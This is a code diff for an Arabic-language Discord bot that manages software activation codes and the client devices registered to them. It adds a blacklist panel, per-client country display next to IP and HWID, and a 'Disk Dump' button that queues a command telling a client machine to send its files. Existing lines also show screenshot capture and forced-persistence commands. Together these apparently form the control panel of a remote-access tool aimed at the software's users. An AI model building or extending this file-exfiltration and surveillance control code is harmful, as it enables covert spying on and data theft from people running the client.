@@ -248,13 +248,37 @@ class DeleteUnusedCodeButton(discord.ui.Button):
             if save_db(db, sha, url, headers, f"Delete unused {self.code}"):
                 await interaction.followup.send(f"🗑️ تم حذف الكود `{self.code}` نهائياً!", ephemeral=True)
 
+class BlacklistedCodesView(discord.ui.View):
+    def __init__(self, blacklisted_codes):
+        super().__init__(timeout=180)
+        for code in blacklisted_codes[:25]:
+            self.add_item(UnbanCodeButton(code))
+
+class UnbanCodeButton(discord.ui.Button):
+    def __init__(self, code):
+        super().__init__(label=f"♻️ رفع الحظر عن: {code}", style=discord.ButtonStyle.success, custom_id=f"unban_code_{code}")
+        self.code = code
+
+    async def callback(self, interaction: discord.Interaction):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if not db: return
+        if self.code in db.get("blacklisted_codes", []):
+            db["blacklisted_codes"].remove(self.code)
+            if self.code in db.get("codes", {}):
+                db["codes"][self.code]["used"] = False
+                db["codes"][self.code]["device"] = None
+            if save_db(db, sha, url, headers, f"Unban code {self.code}"):
+                await interaction.followup.send(f"♻️ تم رفع الحظر عن الكود `{self.code}` بنجاح!", ephemeral=True)
+
 class DeviceActionsView(discord.ui.View):
-    def __init__(self, code, hwid, ip, port):
+    def __init__(self, code, hwid, ip, port, country):
         super().__init__(timeout=60)
         self.code = code
         self.hwid = hwid
         self.ip = ip
         self.port = port
+        self.country = country
 
     @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
     async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -310,6 +334,16 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Screenshot {self.code}"):
                 await interaction.followup.send("📸 تم إرسال أمر التقاط الشاشة!", ephemeral=True)
 
+    @discord.ui.button(label="📂 سحب الملفات (Disk Dump)", style=discord.ButtonStyle.secondary, custom_id="dev_act_diskdump", row=1)
+    async def diskdump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_disk_dumps" not in db: db["remote_disk_dumps"] = {}
+            db["remote_disk_dumps"][self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Disk dump for {self.code}"):
+                await interaction.followup.send("📂 تم إرسال أمر سحب الملفات للعميل!", ephemeral=True)
+
     @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=2)
     async def lock_app_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
@@ -362,17 +396,19 @@ class DeviceManageButton(discord.ui.Button):
     def __init__(self, code, info):
         ip = info.get("ip", "Unknown")
         port = info.get("port", "7680")
-        super().__init__(label=f"🌐 {ip} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
+        country = info.get("country", "Unknown")
+        super().__init__(label=f"🌐 {ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
         self.code = code
         self.info = info
 
     async def callback(self, interaction: discord.Interaction):
         ip = self.info.get('ip', 'Unknown')
         port = self.info.get('port', '7680')
-        view = DeviceActionsView(self.code, self.info.get("device"), ip, port)
+        country = self.info.get('country', 'Unknown')
+        view = DeviceActionsView(self.code, self.info.get("device"), ip, port, country)
         if not interaction.response.is_done():
             await interaction.response.send_message(
-                f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP: `{ip}`\n🔒 HWID: `{self.info.get('device')}`", 
+                f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP: `{ip}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{self.info.get('device')}`", 
                 view=view, ephemeral=True
             )
 
@@ -394,7 +430,21 @@ class MainDashboardView(discord.ui.View):
         view = UnusedManagementView(unused_list)
         await interaction.followup.send(f"🟢 **الأكواد المتاحة (اختر للحذف):**\n📊 العدد: `{len(unused_list)}`", view=view, ephemeral=True)
 
-    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
+    @discord.ui.button(label="🚫 إدارة الأكواد المحظورة", style=discord.ButtonStyle.danger, custom_id="dash_main_blacklist", row=0)
+    async def blacklist_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, _, _, _ = fetch_db()
+        if not db:
+            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
+            return
+        blacklisted = db.get("blacklisted_codes", [])
+        if not blacklisted:
+            await interaction.followup.send("🟢 لا توجد أي أكواد محظورة حالياً.", ephemeral=True)
+            return
+        view = BlacklistedCodesView(blacklisted)
+        await interaction.followup.send(f"🚫 **الأكواد المحظورة (اضغط لرفع الحظر):**\n📊 العدد: `{len(blacklisted)}`", view=view, ephemeral=True)
+
+    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=1)
     async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
@@ -409,7 +459,7 @@ class MainDashboardView(discord.ui.View):
         await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
 
 # ==========================================
-# الأوامر الأساسية والشاملة (Slash Commands)
+# الأوامر الأساسية الشاملة (Slash Commands)
 # ==========================================
 
 @client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
@@ -486,7 +536,7 @@ async def check_code(interaction: discord.Interaction, code: str):
         return
     info = db["codes"][code]
     status = "مستخدم 🔴" if info.get("used") else "متاح 🟢"
-    await interaction.followup.send(f"🔍 **الكود `{code}`:**\n📌 الحالة: {status}\n🌐 IP: `{info.get('ip') or 'غير متصل'}`\n🔒 HWID: `{info.get('device') or 'لا يوجد'}`", ephemeral=True)
+    await interaction.followup.send(f"🔍 **الكود `{code}`:**\n📌 الحالة: {status}\n🌐 IP: `{info.get('ip') or 'غير متصل'}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n🔒 HWID: `{info.get('device') or 'لا يوجد'}`", ephemeral=True)
 
 @client.tree.command(name="delete", description="حذف كود نهائياً")
 @app_commands.describe(code="الكود المراد حذفه")
@@ -556,10 +606,12 @@ async def stats_gui_command(interaction: discord.Interaction):
     total = len(codes)
     used = sum(1 for c in codes.values() if c.get("used"))
     available = total - used
+    blacklisted = len(db.get("blacklisted_codes", []))
     embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", color=0xA871FF)
     embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
     embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
     embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
+    embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
     await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)
 
 if TOKEN:
